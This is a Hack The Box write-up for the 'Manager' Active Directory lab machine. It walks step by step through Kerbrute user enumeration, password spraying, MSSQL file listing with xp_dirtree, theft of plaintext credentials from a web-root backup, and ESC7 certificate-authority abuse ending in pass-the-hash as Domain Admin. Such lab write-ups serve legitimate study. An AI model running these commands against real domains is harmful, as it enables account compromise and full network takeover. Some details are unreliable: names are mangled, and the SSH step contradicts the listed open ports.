---
description: >-
  Difficulty: Medium OS: Windows Attack Path: Kerberos User Enum → Password
  Spray → MSSQL as operator → xp_dirtree File Enum → Backup ZIP with
  .old-conf.xml → SSH as raven → ESC7 AD CS Privesc → Domain
---

# Manager

## Overview

Manager is a medium Windows Active Directory box. The machine runs a Microsoft SQL Server exposed to the network. We enumerate valid domain users with Kerbrute, password spray to get credentials for the operator account, then log into MSSQL. From there we use xp\_dirtree to list the web root and find a backup ZIP file sitting in IIS. That ZIP contains a hidden .old-conf.xml with plaintext credentials for the aven user. SSH in as raven, then abuse **AD CS ESC7** (misconfigured certificate authority permissions) to elevate to Domain Admin.

## Enumeration

### Nmap Scan

Target IP: 10.10.11.236

`bash nmap -T4 -A -v 10.10.11.236`

![Nmap Scan — Windows AD Box with MSSQL on 1433](<../../.gitbook/assets/Unknown image (307)>)

**Key Open Ports:**

| Port              | Service  | Notes                     |
| ----------------- | -------- | ------------------------- |
| 53                | DNS      | Domain: manager.htb       |
| 80                | HTTP     | Microsoft IIS 10.0        |
| 88                | Kerberos | Windows DC confirmed      |
| 135/139/445       | SMB/RPC  | Windows AD                |
| 389/636/3268/3269 | LDAP     | Active Directory          |
| 1433              | MSSQL    | Microsoft SQL Server 2019 |

The Kerberos port 88 tells us this is a **Domain Controller**. LDAP confirms the domain is manager.htb. MSSQL on 1433 is a big target.

Add manager.htb and dc01.manager.htb to /etc/hosts.

## User Enumeration — Kerbrute

Since Kerberos is exposed, we can enumerate valid usernames without authentication using **Kerbrute**:

`bash ./kerbrute_linux_amd64 userenum -d manager.htb \ ~/Desktop/SecLists/Usernames/xato-net-10-million-usernames.txt \ --dc 10.10.11.236`

![Kerbrute — Valid Usernames Enumerated from manager.htb](<../../.gitbook/assets/Unknown image (308)>)

**Valid users found:**

* ryan, guest, cheng, raven, administrator, Ryan, Raven, operator, Guest, Cheng

## Password Spraying — crackmapexec

With the valid user list, spray common passwords across SMB. A classic trick for AD boxes is to try username:username (same password as the username):

`ash crackmapexec smb manager.htb -u users -p passwords`

![CrackMapExec Spray — operator:operator Hit!](<../../.gitbook/assets/Unknown image (309)>) ![CrackMapExec — operator:operator Confirmed Valid](<../../.gitbook/assets/Unknown image (310)>)

Got a hit: **operator:operator** — the operator account has its username as the password.

## Foothold — MSSQL as operator

Connect to the MSSQL server using Impacket's mssqlclient.py with Windows authentication:

`ash python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \ -port 1433 manager.htb/operator:operator@10.10.11.236 \ -windows-auth`

![MSSQL Login as operator — Microsoft SQL Server 2019](<../../.gitbook/assets/Unknown image (311)>)

We're connected! The operator user doesn't have xp\_cmdshell enabled but we can use xp\_dirtree to list the file system.

First check what databases exist:

`sql SELECT name FROM master.dbo.sysdatabases;`

![MSSQL — Default System Databases Only (master, tempdb, model, msdb)](<../../.gitbook/assets/Unknown image (312)>)

Nothing interesting in the databases. Let's look at the file system instead.

## File Enumeration — xp\_dirtree

xp\_dirtree lets us list directories on the server through MSSQL — very useful for finding hidden files:

`sql EXEc xp_dirtree 'C:\inetpub\wwwroot', 1, 1;`

![xp\_dirtree — wwwroot Contents Including website-backup-27-07-23-old.zip](<../../.gitbook/assets/Unknown image (313)>)

**Found something interesting:**

`website-backup-27-07-23-old.zip`

A backup ZIP file sitting in the web root — that means it's directly downloadable via HTTP!

## Extracting the Backup

Download it straight from the browser / wget:

`ash wget 10.10.11.236/website-backup-27-07-23-old.zip`

![wget — Downloading website-backup-27-07-23-old.zip (1 MB)](<../../.gitbook/assets/Unknown image (314)>)

Unzip and browse the contents:

![ZIP Contents — .old-conf.xml File Visible](<../../.gitbook/assets/Unknown image (315)>)

There's a hidden file: **.old-conf.xml** — the dot prefix means it's hidden on Linux but Windows IIS still served it through the ZIP.

## Credentials in .old-conf.xml

Open .old-conf.xml:

![.old-conf.xml — raven:R4v3nBe5tD3veloP3r!123 in Plaintext](<../../.gitbook/assets/Unknown image (316)>)

`xml <ldap-conf> <server> <host>dc01.manager.htb</host> <access-user> <user>raven@manager.htb</user> <password>R4v3nBe5tD3veloP3r!123</password> </access-user> </server> </ldap-conf>`

Plaintext credentials for \*\* aven\*\*:

* **User:** aven@manager.htb
* **Password:** R4v3nBe5tD3veloP3r!123

## User Shell — SSH as raven

WinRM or SSH? This box has SSH open. Log straight in:

`ash ssh raven@manager.htb`

Using password R4v3nBe5tD3veloP3r!123 — we're in. Grab user.txt from the Desktop.

## Privilege Escalation — AD CS ESC7

### Checking Certificate Authority Permissions

Raven has interesting permissions on the AD Certificate Services (AD CS). Check with certipy:

`bash certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \ -dc-ip 10.10.11.236 -vulnerable`

Raven has ManageCA rights on the Certificate Authority. This is **ESC7** — when a low-privileged user can manage the CA, they can enable the SubCA template and issue themselves a certificate as any user including Administrator.

### ESC7 Exploitation Steps

**Step 1:** Add yourself as a Certificate Officer (gives Manage Certificates right):

`ash certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \ -dc-ip 10.10.11.236 -ca manager-DC01-CA \ -add-officer raven`

**Step 2:** Enable the SubCA template:

`bash certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \ -dc-ip 10.10.11.236 -ca manager-DC01-CA \ -enable-template SubCA`

**Step 3:** Request a certificate for the Administrator — it will fail (denied) but saves a private key:

`bash certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \ -dc-ip 10.10.11.236 -ca manager-DC01-CA \ -template SubCA -upn administrator@manager.htb`

Note the **Request ID** from the failed request.

**Step 4:** Issue the denied request using your ManageCA rights:

`bash certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \ -dc-ip 10.10.11.236 -ca manager-DC01-CA \ -issue-request <REQUEST_ID>`

**Step 5:** Retrieve the issued certificate:

`bash certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \ -dc-ip 10.10.11.236 -ca manager-DC01-CA \ -retrieve <REQUEST_ID>`

**Step 6:** Use the certificate to get the Administrator's NTLM hash:

`bash certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236`

This gives us the **Administrator NTLM hash**. Use it for pass-the-hash:

`bash evil-winrm -i manager.htb -u Administrator -H <NTLM_HASH>`

We're Domain Admin. Read root.txt from C:\Users\Administrator\Desktop.

## Summary

| Step                        | Detail                                                           |
| --------------------------- | ---------------------------------------------------------------- |
| Recon                       | Nmap → AD DC with MSSQL on 1433                                  |
| User Enum                   | Kerbrute → valid usernames from Kerberos                         |
| Password Spray              | crackmapexec → operator:operator                                 |
| MSSQL                       | Logged in as operator using Windows auth                         |
| xp\_dirtree                 | Listed C:\inetpub\wwwroot → found backup ZIP                     |
| Backup ZIP                  | Downloaded website-backup-27-07-23-old.zip                       |
| .old-conf.xml               | Plaintext creds →                                                |
| aven:R4v3nBe5tD3veloP3r!123 |                                                                  |
| SSH                         | Logged in as raven                                               |
| AD CS ESC7                  | ManageCA rights → SubCA template → Admin certificate → NTLM hash |
| Domain Admin                | Pass-the-hash → Administrator                                    |

***

## Key Takeaways

* **Kerbrute** is great for enumerating valid domain users without triggering lockouts — Kerberos pre-auth errors tell you if a username is valid
* **Username = Password** spraying still works — operator:operator is a textbook weak credential
* **xp\_dirtree** in MSSQL is a powerful enumeration technique — even without xp\_cmdshell you can map the file system
* **Backup files in web roots are dangerous** — .old-conf.xml with plaintext credentials is a critical misconfiguration
* **AD CS ESC7** is a serious Active Directory vulnerability — ManageCA permissions should be tightly controlled

&#x20;_Platform: Hack The Box_
